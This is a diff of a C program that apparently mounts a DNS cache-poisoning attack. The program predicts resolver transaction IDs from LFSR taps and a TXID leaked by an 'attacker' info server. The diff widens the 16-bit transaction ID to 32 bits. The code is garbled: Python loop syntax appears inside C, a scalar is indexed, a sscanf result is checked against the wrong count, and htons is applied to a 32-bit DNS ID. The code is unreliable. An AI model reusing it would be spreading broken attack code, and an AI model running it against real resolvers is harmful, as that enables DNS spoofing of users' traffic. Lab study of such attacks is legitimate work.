@@ -15,18 +15,18 @@
 int build_dns_query(unsigned char *buffer, const char *hostname);
 
 // Function to fill the txid_ls with the 10 possible txid
-void fill_txids(unsigned short *txid_ls, unsigned short txid){
+void fill_txids(uint32_t *txid_ls, uint32_t txid){
     // if the LSbit of r_1 = LSbit r_2 = 0 
     txid_ls[8] = txid >> 1;
-    // set the left most bit of txid_ls[0] to 1, txid is 16 bits
-    txid_ls[9] = txid[0] | 0x8000;
+    // set the left most bit of txid_ls[0] to 1, txid is 32 bits
+    txid_ls[9] = txid[0] | 0x80000000;
 
     // else if the LSbit of r_1 = LSbit r_2 = 1
     for i in range(4):
-        txid_ls[i] = (((txid >> 1) ^ TAP1 ^ TAP2) >> 1) ^ TAP1 ^ TAP2 | (14<<i);
+        txid_ls[i] = (((txid >> 1) ^ TAP1 ^ TAP2) >> 1) ^ TAP1 ^ TAP2 | (30<<i);
     
     for i in range(4):
-        txid_ls[4 + i] = ((txid >> 1) ^ TAP1 ^ TAP2) >> 1 | (14<<i);
+        txid_ls[4 + i] = ((txid >> 1) ^ TAP1 ^ TAP2) >> 1 | (30<<i);
 }
     
 
@@ -56,12 +56,12 @@ int socket_creation(struct sockaddr_in *server_addr){
 }
 
 // Function to communicate with the info server and get the txid
-void run_attack(unsigned short *txid_ls) {
+void run_attack(uint32_t *txid_ls) {
     // connect to server attacker
     int sockfd1;
     struct sockaddr_in server_addr1;
     char txid_buffer[BUFFER_SIZE];
-    unsigned short txid = 0;
+    uint32_t txid = 0;
     unsigned int source_port = 0;
 
     sockfd1 = socket_creation(&server_addr1);
@@ -110,7 +110,7 @@ void run_attack(unsigned short *txid_ls) {
     printf("Received from server: %s\n", txid_buffer);
 
     // Parse the txid
-    if (sscanf(txid_buffer, "TXID: %hu, port: %u", &txid, &source_port) != 1) {
+    if (sscanf(txid_buffer, "TXID: %u, port: %u", &txid, &source_port) != 1) {
         fprintf(stderr, "Failed to parse TXID from server response\n");
         close(sockfd);
         exit(EXIT_FAILURE);
@@ -129,7 +129,7 @@ void run_attack(unsigned short *txid_ls) {
 // Function to build a DNS query
 int build_dns_query(unsigned char *buffer, const char *hostname) {
     int query_len = 0;
-    unsigned short txid = htons(0x1234); // Transaction ID
+    uint32_t txid = htons(0x1234); // Transaction ID
     unsigned short flags = htons(0x0100); // Standard query
     unsigned short q_count = htons(1);   // 1 question
     unsigned short ans_count = 0;        // No answers
@@ -233,7 +233,7 @@ void send_dns_query(const char *hostname) {
 }
 
 int main() {
-    unsigned short txid[10];
+    uint32_t txid[10];
 
     // Step 1: Get the TXID from the info server
     run_attack(txid);
